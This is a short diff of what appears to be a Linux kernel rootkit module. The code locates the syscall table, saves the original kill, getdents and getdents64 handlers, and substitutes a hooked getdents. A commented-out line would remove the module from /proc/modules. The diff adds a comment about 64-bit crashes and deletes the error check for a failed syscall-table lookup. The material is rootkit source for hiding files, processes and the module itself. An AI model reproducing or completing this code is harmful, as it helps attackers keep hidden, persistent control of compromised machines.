@@ -96,7 +96,7 @@ struct linux_dirent {
 asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
 asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 
-asmlinkage long new_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
+asmlinkage long new_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) { //crashes out on 64bits after about 1min
     char *buf[count];
     long /*bpos,*/nread;
     //struct file *fileh;
@@ -153,7 +153,6 @@ static int init(void) { //initial function, sets up syscall hijacking
     //struct module *myself = &__this_module; //commented to hide gcc warning
     //list_del(&myself->list); //remove from places such as /proc/modules
 	syscall_table = (address *)find(); //give us the syscall table (defined above find())
-    if (!syscall_table) {cleanup_module(); } //if find() fails, unload
     original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
     original_getdents = (void *)syscall_table[__NR_getdents];
     original_getdents64 = (void *)syscall_table[__NR_getdents64];
